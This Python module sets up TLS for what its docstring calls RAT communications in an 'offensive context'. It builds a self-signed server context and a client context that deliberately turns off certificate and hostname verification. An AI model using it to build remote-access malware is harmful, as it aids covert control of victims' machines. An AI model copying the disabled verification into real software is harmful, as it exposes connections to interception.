"""
TLS configuration module for encrypting RAT communications.

The server uses a self-signed certificate (server.crt + server.key).
The client connects without certificate verification (CERT_NONE),
which is intentional in this offensive context.
"""

import ssl
from pathlib import Path

# Path to certificates (relative to the project root)
CERT_DIR = Path(__file__).parent.parent.parent.parent / "certs"
CERT_FILE = CERT_DIR / "server.crt"
KEY_FILE = CERT_DIR / "server.key"


def create_server_ssl_context() -> ssl.SSLContext:
    if not CERT_FILE.exists() or not KEY_FILE.exists():
        raise FileNotFoundError(
            f"TLS certificate not found in {CERT_DIR}. Run first: python generate_cert.py"
        )

    # Server context: enforce TLS, load our self-signed cert
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.load_cert_chain(certfile=str(CERT_FILE), keyfile=str(KEY_FILE))

    return context


def create_client_ssl_context() -> ssl.SSLContext:
    # Client context: no server certificate verification
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2

    return context
